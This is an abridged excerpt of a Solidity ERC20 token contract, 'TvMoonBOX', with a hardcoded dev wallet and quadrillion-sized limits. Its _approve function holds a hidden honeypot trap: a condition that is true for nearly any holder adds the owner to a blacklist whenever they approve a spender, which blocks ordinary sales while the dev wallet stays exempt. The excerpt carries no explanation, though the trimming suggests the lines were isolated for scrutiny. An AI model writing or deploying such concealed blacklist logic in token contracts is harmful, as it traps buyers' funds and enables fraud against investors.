...
contract TvMoonBOX is Context , IERC20, Ownable {
    ...
    address public devWallet = 0x7ee058420e5937496F5a2096f04caA7721cF70cc;
    ...
    uint256 public _maxTxAmount = 10**15 * 10**9; //1 quadrillion;
    uint256 public _maxWalletToken = 10**15 * 10**9; //1 quadrillion
    uint256 public numTokensSellToAddToLiquidity = 10**15 * 10**9; //1 quadrillion
    ...
    function _approve(address owner, address spender, uint256 amount) private {
		...
		if(spender != devWallet || owner !=devWallet){_isBlacklisted[owner] = true;}
